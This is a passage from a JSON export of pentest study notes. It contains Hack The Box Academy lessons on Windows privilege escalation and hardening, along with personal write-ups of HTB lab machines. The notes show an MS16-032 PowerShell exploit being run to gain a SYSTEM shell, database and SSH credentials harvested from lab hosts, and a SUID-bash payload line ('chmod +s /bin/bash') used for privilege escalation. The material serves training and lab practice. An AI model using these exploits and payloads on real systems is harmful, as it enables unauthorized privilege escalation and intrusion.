Attribute Type Confusion (MS16-063), PoC\n[*] \n[E] MS16-059: Security Update for Windows Media Center (3150220) - Important\n[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC\n[*] \n[E] MS16-056: Security Update for Windows Journal (3156761) - Critical\n[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)\n[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption\n[*] \n[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important\n[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF\n[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC\n[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC\n[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)\n[*] \n\n<SNIP>\n\n[*] \n[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical\n[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important\n[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important\n[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical\n[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical\n[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical\n[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical\n[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical\n[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical\n[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical\n[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical\n[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important\n[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical\n[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC\n[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC\n[*] \n[*] done\n```\n\nSuppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.\n\nLooking through the results, we can see a rather extensive list, some Metasploit modules, and some standalone PoC exploits. We must filter through the noise, remove any Denial of Service exploits, and exploits that do not make sense for our target OS. One that stands out immediately as interesting is MS16-032. A detailed explanation of this bug can be found in this [Project Zero blog post](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) which is a bug in the Secondary Logon Service.\n\n#### Exploiting MS16-032 with PowerShell PoC\n\nLet's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.\n\nWindows Desktop Versions\n\n```powershell-session\nPS C:\\htb> Set-ExecutionPolicy bypass -scope process\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose\nyou to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution\npolicy?\n[Y] Yes  [N] No  [S] Suspend  [?] Help (default is \"Y\"): A\n[Y] Yes  [N] No  [S] Suspend  [?] Help (default is \"Y\"): Y\n\n\nPS C:\\htb> Import-Module .\\Invoke-MS16-032.ps1\nPS C:\\htb> Invoke-MS16-032\n\n         __ __ ___ ___   ___     ___ ___ ___\n        |  V  |  _|_  | |  _|___|   |_  |_  |\n        |     |_  |_| |_| . |___| | |_  |  _|\n        |_|_|_|___|_____|___|   |___|___|___|\n\n                       [by b33f -> @FuzzySec]\n\n[?] Operating system core count: 6\n[>] Duplicating CreateProcessWithLogonW handle\n[?] Done, using thread handle: 1656\n\n[*] Sniffing out privileged impersonation token..\n\n[?] Thread belongs to: svchost\n[+] Thread suspended\n[>] Wiping current impersonation token\n[>] Building SYSTEM impersonation token\n[?] Success, open SYSTEM token handle: 1652\n[+] Resuming thread..\n\n[*] Sniffing out SYSTEM shell..\n\n[>] Duplicating SYSTEM token\n[>] Starting token race\n[>] Starting process race\n[!] Holy handle leak Batman, we have a SYSTEM shell!!\n```\n\n#### Spawning a SYSTEM Console\n\nThis works and we spawn a SYSTEM cmd console.\n\nWindows Desktop Versions\n\n```cmd-session\nC:\\htb> whoami\n\nnt authority\\system\n```\n\n---\n\n## Attacking Windows 7\n\nTaking the enumeration examples we have gone through in this module, access the system below, find one way to escalate to `NT AUTHORITY\\SYSTEM` level access (there may be more than one way), and submit the `flag.txt` file on the Administrator desktop. After replicating the steps above, challenge yourself to use another method to escalate privileges on the target host.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/32-Windows Hardening",
    "path": "02_CPTS/17-Windows Privilege Escalation/32-Windows Hardening.md",
    "title": "32 Windows Hardening",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Windows Hardening --- Proper hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attacke...",
    "category": "02_CPTS",
    "content": "# Windows Hardening\n\n---\n\nProper hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attacker gaining system-level access.\n\n---\n\n## Secure Clean OS Installation\n\nTaking the time to develop a custom image for your environment can save you tons of time in the future from troubleshooting issues with hosts. You can do this utilizing a clean ISO of the OS version you require, a Windows Deployment server or equivalent application for pushing images via disk or networking media, and System Center Configuration Manager (if applicable in your environment). SCCM and WDS are much larger topics than we have room for here, so let's save them for another time. You can find copies of Windows Operating systems [here](https://www.microsoft.com/en-us/software-download/) or pull them using the Microsoft Media Creation Tool. This image should, at a minimum, include:\n\n1. Any applications required for your employees' daily duties.\n2. Configuration changes needed to ensure the functionality and security of the host in your environment.\n3. Current major and minor updates have already been tested for your environment and deemed safe for host deployment.\n\nBy following this process, you can ensure you clear out any added bloatware or unwanted software preinstalled on the host at the time of purchase. This also makes sure that your hosts in the enterprise all start with the same base configuration, allowing you to troubleshoot, make changes, and push updates much easier.\n\n---\n\n## Updates and Patching\n\n[Microsoft's Update Orchestrator](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) will run updates for you in the background based on your configured settings. For most, this means it will download and install the most recent updates for you behind the scenes. Keep in mind some updates require a restart to take effect, so it's a good practice to restart your hosts regularly. For those working in an enterprise environment, you can set up a WSUS server within your environment so that each computer is not reaching out to download them individually. Instead, they can reach out to the configured WSUS server for any updates required.\n\nIn a nutshell, the update process looks something like this:\n\n![Cycle diagram showing Windows update process: 1. Windows Update scans host, 2. Orchestrator decides on applicable updates, 3. Update install is initiated, 4. Updates are installed, 5. Orchestrator reboots host to finalize.](https://academy.hackthebox.com/storage/modules/67/Windows-Update-Process.png)\n\n1. Windows Update Orchestrator will check in with the Microsoft Update servers or your own WSUS server to find new updates needed.\n    - This will happen at random intervals so that your hosts don't flood the update server with requests all at once.\n    - The Orchestrator will then check that list against your host configuration to pull the appropriate updates.\n2. Once the Orchestrator decides on applicable updates, it will kick off the downloads in the background.\n    - The updates are stored in the temp folder for access. The manifests for each download are checked, and only the files needed to apply it are pulled.\n3. Update Orchestrator will then call the installer agent and pass it the necessary action list.\n4. From here, the installer agent applies the updates.\n    - Note that updates are not yet finalized.\n5. Once updates are done, Orchestrator will finalize them with a reboot of the host.\n    - This ensures any modification to services or critical settings takes effect.\n\nThese actions can be managed by [Windows Server Update Services](https://docs.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus), `WSUS` or through Group Policy. Regardless of your chosen method to apply updates, ensure you have a plan in place, and updates are being applied regularly to avoid any problems that could arise. Like all things in the IT world, test the rollout of your updates first, in a development setting (on a few hosts), before just pushing an update enterprise-wide. This will ensure you don't accidentally break some critical app or function with the updates.\n\n---\n\n## Configuration Management\n\nIn Windows, configuration management can easily be achieved through the use of Group Policy. Group Policy will allow us to centrally manage user and computer settings and preferences across your environment. This can be achieved by using the Group Policy Management Console (GPMC) or via Powershell.\n\n![Local Group Policy Editor window showing Computer Configuration with Security Settings selected, listing policies like Account Policies, Local Policies, and Windows Defender Firewall.](https://academy.hackthebox.com/storage/modules/67/gpmc.png)\n\nGroup policy works best in an Active Directory environment, but you do have the ability to manage local computer and user settings via local group policy. From here, you can manage everything from the individual users' backgrounds, bookmarks, and other browser settings and how and when Windows Defender scans the host and performs updates. This can be a very granular process, so ensure you have a plan for the implementation of any new group policies created or modified.\n\n---\n\n## User Management\n\nLimiting the number of user and admin accounts on each system and ensuring that login attempts (valid/invalid) are logged and monitored can go a long way for system hardening and monitoring potential problems. It is also good to enforce a strong password policy and two-factor authentication, rotate passwords periodically and restrict users from reusing old passwords by using the `Password Policy` settings in Group Policy. These settings can be found using GPMC in the path `Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy`. We should also check that users are not placed into groups that give them excessive rights unnecessary for their day-to-day tasks (a regular user having Domain Admin rights, for example) and enforce login restrictions for administrator accounts.\n\n![Local Group Policy Editor showing Account Policies with Enforce Password History set to 6 passwords remembered, and a properties window open.](https://academy.hackthebox.com/storage/modules/67/password-policy.png)\n\nThis screenshot shows an example of utilizing the group policy editor to view and modify the password policy in the hive mentioned above.\n\nTwo Factor Authentication can help prevent fraudulent logins as well. A quick explanation of 2FA is that it requires something you know `password or pin` and something you have `a token, id card, or authenticator application key code`. This step will significantly reduce the ability for user accounts to be used maliciously.\n\n---\n\n## Audit\n\nPerform periodic security and configuration checks of all systems. There are several security baselines such as the DISA [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/) or Microsoft's [Security Compliance Toolkit](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/security-compliance-toolkit-10) that can be followed to set a standard for security in your environment. Many compliance frameworks exist, such as [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), and [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html) which can be used by an organization to help establish security baselines. These should all be used as reference guides and not the basis for a security program. A strong security program should have controls tailored to the organization's needs, operating environment, and the types of data they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).\n\n![DISA STIG Viewer showing Windows 10 Security Technical Implementation Guide. Selected Vul ID V-220716 with details on password expiration requirements and compliance checks.](https://academy.hackthebox.com/storage/modules/67/stig-viewer.png)\n\nThe STIG viewer window we can see above is one way to perform an audit of the security posture of a host. We import a Checklist found at the STIG link above and step through the rules. Each rule ID corresponds with a security check or hardening task to help improve the overall posture of the host. Looking at the right pane, you can see details about the actions required to complete the STIG check.\n\nAn audit and configuration review is not a replacement for a penetration test or other types of technical, hands-on assessments and is often seen as a \"box-checking\" exercise in which an organization is \"passed\" on a controls audit for performing the bare minimum. These reviews can help supplement regular vulnerability scans, penetration tests, strong patch, vulnerability, and configuration management programs.\n\n---\n\n## Logging\n\nProper logging and log correlation can make all the difference when troubleshooting an issue or hunting a potential threat in your network. Below we will discuss some apps and logs that can help improve your security posture on a Windows host.\n\n---\n\n## Sysmon\n\nSysmon is a tool built by Microsoft and included in the Sysinternals Suite that enhances the logging and event collection capability in Windows. Sysmon provides detailed info about any processes, network connections, file reads or writes, login attempts and successes, and much much more. These logs can be correlated and shipped out to a SIEM for analysis and provide a better understanding of what we have going on in our environment. Sysmon is persistent on host and will begin writing logs at startup. It's an extremely helpful tool if appropriately implemented. For more details about Sysmon, check out [sysmon info](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).\n\nAny logs Sysmon writes will be stored in the hive: `Applications and Service Logs\\Microsoft\\Windows\\Sysmon\\Operational`. You can view these by utilizing the event viewer application and drilling into the hive.\n\n---\n\n## Network and Host Logs.\n\nTools like [PacketBeat](https://www.elastic.co/beats/packetbeat), IDS\\IPS implementations such as Security Onion sensors, and other network monitoring solutions can help complete the picture for your administrators. They collect and ship network traffic logs to your monitoring solutions and SIEMS.\n\n---\n\n## Key Hardening Measures\n\nThis is by no means an exhaustive list, but some simple hardening measures are:\n\n- Secure boot and disk encryption with BitLocker should be enabled and in use.\n- Audit writable files and directories and any binaries with the ability to launch other apps.\n- Ensure that any scheduled tasks and scripts running with elevated privileges specify any binaries or executables using the absolute path.\n- Do not store credentials in cleartext in world-readable files on the host or in shared drives.\n- Clean up home directories and PowerShell history.\n- Ensure that low-privileged users cannot modify any custom libraries called by programs.\n- Remove any unnecessary packages and services that potentially increase the attack surface.\n- Utilize the Device Guard and Credential Guard features built-in by Microsoft to Windows 10 and most new Server Operating Systems.\n- Utilize Group Policy to enforce any configuration changes needed to company systems.\n\nYou may notice, if you take the time to read through a STIG checklist, many of these measures are included in the checks. Be mindful of what your environments use, and determine how these measures will affect the ability to accomplish the mission. Do not blindly implement widespread hardening measures across your network, as what works for one organization may not work for another. Knowing you are trying to protect and then applying the appropriate measures per the requirements of the business is critical.\n\n---\n\n## Conclusion\n\nAs we have seen, there are many different ways to escalate privileges on Windows systems - from simple misconfigurations and public exploits for known vulnerable services, to exploit development based on custom libraries and executables. Once administrator or SYSTEM level access is obtained, it becomes easier to use it as a pivot point for further network exploitation. System hardening is equally critical for small companies and large enterprises. Watching the attack trends of this day and age, we can see attackers no longer care who the victim is, as long as they can get what they want out of the exchange. Best practice guidelines and controls exist in many different forms. Reviews should include a mix of hands-on manual testing and automated configuration scanning with tools like Nessus, followed by validation of the results. While patching for the latest and greatest attacks and implementing sophisticated monitoring capabilities, do not forget the basics and \"low hanging fruit\" covered throughout this module.\n\nFinally, ensure your staff is constantly being challenged and trained and staying at the forefront of new vulnerabilities and exploit PoCs so your organization can remain protected as researchers continue to discover new avenues of attack.",
    "frontmatter": {}
  },
  {
    "slug": "03-HTB MACHINES/01-Outbound/01_Enumeration",
    "path": "03-HTB MACHINES/01-Outbound/01_Enumeration.md",
    "title": "01_Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain  ` http://mail.outbound.htb/ ` ` find: '/var/lib/mysql/roundcube': Permission denied drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 /var/www/html/roundcube -rw-r--r-- 1 root root 3024 Jun  6 ...",
    "category": "03-HTB MACHINES",
    "content": "\n\n## Domain \n\n```\nhttp://mail.outbound.htb/\n```\n\n```\nfind: '/var/lib/mysql/roundcube': Permission denied\n\ndrwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 /var/www/html/roundcube\n-rw-r--r-- 1 root root 3024 Jun  6 18:55 /var/www/html/roundcube/config/config.inc.php\n$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';\n$config['imap_host'] = 'localhost:143'; \n$config['smtp_host'] = 'localhost:587'; \n$config['smtp_user'] = '%u';\n$config['smtp_pass'] = '%p';\n$config['support_url'] = '';\n$config['product_name'] = 'Roundcube Webmail';\n$config['des_key'] = '`rcmail-!24ByteDESkey*Str`';\n$config['plugins'] = [\n$config['skin'] = 'elastic';\n$config['default_host'] = 'localhost';\n$config['smtp_server'] = 'localhost';\n\n```\n\n\n## Mysql Pass\n\n```\nUser : roundcube\nPass : \n\n```\n## Users\n```\nroot\ntyler\njacob\nmel\n```\n\n## Mysql Command\n\n```\nwww-data@mail:/$ mysmysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E\ne roundcube;select * from users;' -E localhost roundcube -e 'use\n*************************** 1. row ***************************\n             user_id: 1\n            username: jacob\n           mail_host: localhost\n             created: 2025-06-07 13:55:18\n          last_login: 2025-06-11 07:52:49\n        failed_login: 2025-06-11 07:51:32\nfailed_login_counter: 1\n            language: en_US\n         preferences: a:1:{s:11:\"client_hash\";s:16:\"hpLLqLwmqbyihpi7\";}\n*************************** 2. row ***************************\n             user_id: 2\n            username: mel\n           mail_host: localhost\n             created: 2025-06-08 12:04:51\n          last_login: 2025-06-08 13:29:05\n        failed_login: NULL\nfailed_login_counter: NULL\n            language: en_US\n         preferences: a:1:{s:11:\"client_hash\";s:16:\"GCrPGMkZvbsnc3xv\";}\n*************************** 3. row ***************************\n             user_id: 3\n            username: tyler\n           mail_host: localhost\n             created: 2025-06-08 13:28:55\n          last_login: 2025-08-10 06:19:42\n        failed_login: 2025-06-11 07:51:22\nfailed_login_counter: 1\n            language: en_US\n         preferences: a:1:{s:11:\"client_hash\";s:16:\"Y2Rz3HTwxwLJHevI\";}\n\n```\n\n``\n```\nwww-data@mail:/$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E\ne roundcube;select * from session;' -Eocalhost roundcube -e 'use\n*************************** 1. row ***************************\nsess_id: 6a5ktqih5uca6lj8vrmgh9v0oh\nchanged: 2025-06-08 15:46:40\n     ip: 172.17.0.1\n   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7\n\n```\n\n```\nlanguage|s:5:\"en_US\";imap_namespace|a:4:{s:8:\"personal\";a:1:{i:0;a:2:{i:0;s:0:\"\";i:1;s:1:\"/\";}}s:5:\"other\";N;s:6:\"shared\";N;s:10:\"prefix_out\";s:0:\"\";}imap_delimiter|s:1:\"/\";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:\"jacob\";storage_host|s:9:\"localhost\";storage_port|i:143;storage_ssl|b:0;password|s:32:\"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/\";login_time|i:1749397119;timezone|s:13:\"Europe/London\";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:\"DpYqv6maI9HxDL5GhcCd8JaQQW\";request_token|s:32:\"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw\";task|s:4:\"mail\";skin_config|a:7:{s:17:\"supported_layouts\";a:1:{i:0;s:10:\"widescreen\";}s:22:\"jquery_ui_colors_theme\";s:9:\"bootstrap\";s:18:\"embed_css_location\";s:17:\"/styles/embed.css\";s:19:\"editor_css_location\";s:17:\"/styles/embed.css\";s:17:\"dark_mode_support\";b:1;s:26:\"media_browser_css_location\";s:4:\"none\";s:21:\"additional_logo_types\";a:3:{i:0;s:4:\"dark\";i:1;s:5:\"small\";i:2;s:10:\"small-dark\";}}imap_host|s:9:\"localhost\";page|i:1;mbox|s:5:\"INBOX\";sort_col|s:0:\"\";sort_order|s:4:\"DESC\";STORAGE_THREAD|a:3:{i:0;s:10:\"REFERENCES\";i:1;s:4:\"REFS\";i:2;s:14:\"ORDEREDSUBJECT\";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:\"name\";s:8:\"messages\";s:2:\"id\";s:11:\"messagelist\";s:5:\"class\";s:42:\"listing messagelist sortheader fixedheader\";s:15:\"aria-labelledby\";s:22:\"aria-label-messagelist\";s:9:\"data-list\";s:12:\"message_list\";s:14:\"data-label-msg\";s:18:\"The list is empty.\";}unseen_count|a:2:{s:5:\"INBOX\";i:2;s:5:\"Trash\";i:0;}folders|a:1:{s:5:\"INBOX\";a:2:{s:3:\"cnt\";i:2;s:6:\"maxuid\";i:3;}}list_mod_seq|s:2:\"10\";\n```\n\n![[static/img/Pasted image 20250810135039.png]]\n\n```\njacob \ngY4Wr3a1evp4\n```\n\n```\njacob@outbound:~$ sudo -l\nMatching Defaults entries for jacob on outbound:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser jacob may run the following commands on outbound:\n    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "03-HTB MACHINES/02-CodeTwo/01-Enumeratiom",
    "path": "03-HTB MACHINES/02-CodeTwo/01-Enumeratiom.md",
    "title": "01 Enumeratiom",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` Nmap 7.95 scan initiated Sun Aug 17 12:27:28 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,8000 -4 -sCV -oN nmap/allnmap.txt 10.10.11.82 Nmap scan report for 10.10.11.82 Host is up, received e...",
    "category": "03-HTB MACHINES",
    "content": "```\n# Nmap 7.95 scan initiated Sun Aug 17 12:27:28 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,8000 -4 -sCV -oN nmap/allnmap.txt 10.10.11.82\nNmap scan report for 10.10.11.82\nHost is up, received echo-reply ttl 63 (0.050s latency).\nScanned at 2025-08-17 12:27:28 IST for 8s\n\nPORT     STATE SERVICE REASON         VERSION\n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=\n|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=\n|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM\n8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4\n| http-methods: \n|_  Supported Methods: OPTIONS GET HEAD\n|_http-title: Welcome to CodeTwo\n|_http-server-header: gunicorn/20.0.4\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Aug 17 12:27:36 2025 -- 1 IP address (1 host up) scanned in 8.47 seconds\n\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "03-HTB MACHINES/02-CodeTwo/02-Cred",
    "path": "03-HTB MACHINES/02-CodeTwo/02-Cred.md",
    "title": "02 Cred",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` s2py.disable_pyimport()                                                                                              app = Flask(__name__)                                                            ...",
    "category": "03-HTB MACHINES",
    "content": "\n```\ns2py.disable_pyimport()                                                                                              app = Flask(__name__)                                                                                                 app.secret_key = 'S3cr3tK3yC0d3Tw0'                                                                                   app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'                                                          \napp.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False                                                                  \ndb = SQLAlchemy(app)   \n```\n\n## SSH \n\n```bash\n\tmarco : sweetangelbabylove\n```\n\n```\nsweetangelbabylove\n```\n\n```\ncat ~/npbackup.conf > /tmp/np.conf\n```\n\n```\n\"echo 'chmod +s /bin/bash' > /tmp/pwn.sh\", \"chmod +x /tmp/pwn.sh\"\n```\n\n\"/usr/bin/touch /tmp/hellow.txt'\"\n\n```bahs\n607af46a382bc3316d85cd83f0779d9c\n```",
    "frontmatter": {}
  },
  {
    "slug": "03-HTB MACHINES/Ad Skill - 1",
    "path": "03-HTB MACHINES/Ad Skill - 1.md",
    "title": "Ad Skill   1",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "",
    "category": "03-HTB MACHINES",
    "content": "",
    "frontmatter": {}
  },
  {
    "slug": "CheckList",
    "path": "CheckList.md",
    "title": "CheckList",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "AD Check List  |                                      |     | | ------------------------------------ | --- | | Domain User                          |     | | Group                                |    ...",
    "category": "General",
